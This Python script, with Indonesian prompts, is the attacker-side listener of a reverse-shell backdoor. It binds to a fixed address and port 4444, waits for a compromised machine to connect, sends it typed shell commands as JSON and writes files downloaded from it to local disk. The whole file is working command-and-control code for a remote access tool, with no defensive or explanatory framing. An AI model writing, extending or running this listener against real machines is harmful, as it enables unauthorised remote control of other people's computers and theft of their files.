import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] menunggu koneksi..")
        self.connection, address = listener.accept()
        print("koneksi terhubung dari: " + str(address))

    def execute_remotely(self,perintah):
            serialized_data = json.dumps(perintah)
            self.connection.sendall(serialized_data.encode())

            if perintah[0] == "exit":
                self.connection.close()
                exit()
            return self.connection.recv(1024)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] file sukses terunduh.."

    def run(self):
        while True:
            perintah = input(">>")
            perintah = perintah.split()
            hasil = self.execute_remotely(perintah)
            if perintah[0] =="download":
                hasil = self.write_file(perintah[1],hasil)
            print(hasil)

eyo_listener = Listener("192.168.1.10",4444)
eyo_listener.run()